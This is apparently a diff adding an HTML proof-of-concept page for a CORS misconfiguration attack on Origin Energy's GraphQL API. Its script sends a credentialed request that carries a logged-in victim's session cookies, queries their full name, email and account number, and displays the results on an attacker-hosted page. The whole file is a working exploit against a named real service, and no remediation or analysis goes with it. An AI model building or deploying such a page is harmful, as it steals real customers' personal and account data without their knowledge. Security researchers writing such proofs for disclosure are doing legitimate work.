@@ -1,0 +1,50 @@
+<html>
+<head>
+    <title>Origin Energy CORS + GraphQL Data Exfiltration PoC</title>
+</head>
+<body>
+    <h1>Origin Energy Account Information is Being Extracted</h1>
+    <p>This page extracts sensitive data using the victim's session cookies (executed via GitHub Pages).</p>
+    <pre id="result">Waiting for data...</pre>
+
+    <script>
+        const SENSITIVE_QUERY = JSON.stringify({
+            // Ensure this query is valid and requires authentication!
+            query: `query { customerProfile { fullName email accountNumber } }` 
+        });
+
+        fetch('https://api.rx.originenergy.com.au/v1/gateway/graphql', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: SENSITIVE_QUERY,
+            credentials: 'include' // CRITICAL: Includes the victim's session cookies.
+        })
+        .then(response => {
+            if (response.status === 200) {
+                return response.json();
+            }
+            throw new Error(`API Error: ${response.status} ${response.statusText}`);
+        })
+        .then(data => {
+            let output = 'SUCCESS! Data Extracted Back to Attacker\'s Domain (GitHub Origin):\n';
+            
+            if (data && data.data && data.data.customerProfile) {
+                const profile = data.data.customerProfile;
+                output += `  Victim's Full Name: ${profile.fullName || 'Empty'}\n`;
+                output += `  Victim's Email: ${profile.email || 'Empty'}\n`;
+                output += `  Victim's Account Number: ${profile.accountNumber || 'Empty'}\n`;
+                document.getElementById('result').textContent = output;
+                console.log("PoC Successful. Extracted Data:", data);
+            } else {
+                document.getElementById('result').textContent = 'API returned success, but data structure was unexpected: ' + JSON.stringify(data, null, 2);
+            }
+        })
+        .catch(error => {
+            document.getElementById('result').textContent = 'Request failed or an error occurred: ' + error.message;
+            console.error('Error Details:', error);
+        });
+    </script>
+</body>
+</html>
